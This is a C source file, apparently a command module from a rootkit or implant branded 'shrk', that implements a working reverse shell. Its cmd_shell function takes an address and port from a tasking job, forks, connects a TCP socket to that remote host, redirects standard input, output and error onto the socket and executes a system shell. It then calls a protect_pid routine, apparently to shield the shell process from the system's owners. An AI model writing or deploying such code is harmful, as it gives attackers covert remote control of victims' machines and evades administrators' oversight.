#include "../inc/cmds.h"

#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <stdio.h>

/*

 * shell command creates a reverse TCP shell connection to a specified address
 * connection is piped to an available shell which is obtained with shell_find()

*/

char *cmd_shell(job_t *job) {
  cmd_recv_all(job);

  char           *data = NULL, *shell = NULL;
  struct sockaddr saddr;
  uint16_t        port = 0, i;
  pid_t           cpid = 0;

  // parse the provided data (we can freely modify it)
  for (data = job->data; *data != 0; data++) {
    if (*data != ' ')
      continue;

    *data = 0;
    port  = atoi(++data);
    break;
  }

  // resolve the provided address
  if (!resolve(NULL, &saddr, job->data, port))
    return "failed to resolve the address";

  // mostly likely we'll find a shell but just in case
  if ((shell = shell_find()) == NULL)
    return "no available shell";

  if ((cpid = fork()) == 0) {
    int s = 0;

    // remove signal handlers
    signal(SIGINT, SIG_DFL);
    signal(SIGILL, SIG_DFL);
    signal(SIGSEGV, SIG_DFL);

    // chdir to rootdir
    if (chdir("/") < 0)
      exit(1);

    // create a TCP socket for the reverse shell connection
    if ((s = socket(saddr.sa_family, SOCK_STREAM, 0)) < 0)
      exit(1);

    // conenct to the the remote address
    if (connect(s, (struct sockaddr *)&saddr, sizeof(struct sockaddr)) < 0)
      exit(1);

    // duplicate std{out,in,err}
    dup2(s, fileno(stdout));
    dup2(s, fileno(stderr));
    dup2(s, fileno(stdin));

    // execute da shell we found
    printf("[shrk] connection was successful, executing %s\n", shell);
    char *const argv[] = {shell, NULL};
    execvp(shell, argv);

    // fuck
    printf("[shrk] execution failed! closing connection\n");
    close(s);
    exit(1);
  }

  if (cpid < 0) {
    job_debug_err("failed to create fork for the reverse shell");
    return "fork failed";
  }

  // protect the PID
  if (!protect_pid(cpid)) {
    job_debug("failed to protect the reverse shell process");
    return "failed to protect the reverse shell process";
  }

  job_debug("launched a child process (%d) for a %s reverse shell", cpid, shell);
  return "success";
}
